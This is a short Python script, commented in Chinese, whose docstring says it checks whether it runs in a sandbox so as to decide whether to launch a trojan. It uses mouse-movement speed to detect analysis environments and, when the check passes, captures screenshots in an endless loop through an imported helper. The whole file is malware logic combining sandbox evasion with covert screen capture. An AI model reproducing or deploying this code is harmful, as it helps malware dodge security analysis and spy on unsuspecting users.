# -*- coding=utf-8 -*-

'''
这段脚本的作用是：
用以判断是否在沙盒之中
从而决定是否要运行木马
'''

from SmoothCriminal import mean_mouse_speed
from screenshotter_json import screenshotter

mouse_move_timeout = 10

if mean_mouse_speed(mouse_move_timeout):
    print("This is a box of sand")
else:
    print("environment ok! let's do it")
    import time
    while True:
        time.sleep(1)
        screenshotter()